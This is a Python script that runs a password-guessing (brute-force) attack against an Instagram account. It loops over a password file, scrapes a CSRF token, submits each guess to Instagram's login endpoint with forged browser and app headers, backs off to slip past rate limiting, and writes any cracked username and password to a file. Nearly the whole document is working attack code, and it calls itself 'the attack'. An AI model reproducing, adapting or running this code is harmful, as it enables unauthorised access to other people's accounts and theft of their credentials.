import requests
import time
import random
import json

def fixed_bruteforce():
    
    TARGET_USERNAME = "username"
    PASSWORDS_FILE = "password.txt"
    SUCCESS_FILE = "success.txt"
    
    with open(PASSWORDS_FILE, 'r', encoding='utf-8') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    print(f"🚀 Starting the attack by fixing the 400 error")
    print(f"📊 Number of passwords: {len(passwords)}")
    print("=" * 50)
    
    session = requests.Session()
    
    # headers  
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/accounts/login/',
        'X-Requested-With': 'XMLHttpRequest',
        'DNT': '1',
        'Connection': 'keep-alive'
    }
    
    for i, password in enumerate(passwords, 1):
        print(f"\n🎯 [{i}/{len(passwords)}] test: {password}")
        
        try:
            # login page
            print("  🔍 Get the login page...")
            response = session.get(
                "https://www.instagram.com/accounts/login/",
                headers=headers,
                timeout=30
            )
            
            if response.status_code != 200:
                print(f"  ❌ Error on page: {response.status_code}")
                continue
            
            # CSRF token
            csrf_token = session.cookies.get('csrftoken')
            print(f"  🔑 CSRF token: {csrf_token}")
            
            if not csrf_token:
                print("  ❌ CSRF token not found")
                continue
            
            
            time.sleep(2)
            
            
            print("  📤 Submit a login request...")
            
            
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}"
            
            login_data = {
                'username': TARGET_USERNAME,
                'enc_password': enc_password,
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            #login headers
            login_headers = headers.copy()
            login_headers.update({
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'X-IG-App-ID': '936619743392459',
                'X-ASBD-ID': '198387',
                'X-IG-WWW-Claim': '0'
            })
            
            # request 
            response = session.post(
                "https://www.instagram.com/accounts/login/ajax/",
                data=login_data,
                headers=login_headers,
                timeout=30
            )
            
            print(f"  📨  response status: {response.status_code}")
            
            #respnse  
            if response.status_code == 200:
                try:
                    json_response = response.json()
                    print(f"  📊 Full response: {json_response}")
                    
                    authenticated = json_response.get('authenticated', False)
                    user = json_response.get('user', False)
                    status = json_response.get('status', 'unknown')
                    
                    if authenticated and user:
                        print(f"  ✅ Success! Correct password: {password}")
                        with open(SUCCESS_FILE, 'w', encoding='utf-8') as f:
                            f.write(f"Username: {TARGET_USERNAME}\nPassword: {password}\n")
                        return True
                    else:
                        print(f"  ❌ Failed - Status: {status}")
                        
                except json.JSONDecodeError:
                    print(f"  ❌Error in processing JSON: {response.text[:100]}")
                    
            elif response.status_code == 400:
                print(f"  ❌ Error 400 - Invalid Data")
                print(f"  🔍 Submitted data: {login_data}")
                print(f"  🔍 Response server {response.text[:200]}")
                
            elif response.status_code == 429:
                print("  🚫 Rate Limiting - Increased Delay")
                time.sleep(60)
                continue
                
            else:
                print(f"  ❌ Error HTTP: {response.status_code}")
                print(f"  🔍 Response: {response.text[:200]}")
            
        except requests.exceptions.Timeout:
            print("  ⏰ Timeout")
        except requests.exceptions.ConnectionError:
            print("  🔌 Connection error")
        except Exception as e:
            print(f"  💥 Unexpected error: {str(e)}")
        
        # Delay between requests
        delay = 10 + random.randint(5, 15)
        print(f"  ⏳ waiting {delay} seconds...")
        time.sleep(delay)
    
    print("\n❌ Attack ended. Password not found.")
    return False

def test_enc_password_format():
    """Test format enc_password"""
    
    test_passwords = ["FM0830129820", "Fm0830129820", "test123"]
    
    for pwd in test_passwords:
        enc_pwd = f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}"
        print(f"passwords: {pwd}")
        print(f"enc_password: {enc_pwd}")
        print("-" * 40)

# Test formatenc_password
print("🔧 test format enc_password:")
test_enc_password_format()
print("\n" + "=" * 50)

# Execute the main attack
if __name__ == "__main__":
    fixed_bruteforce()
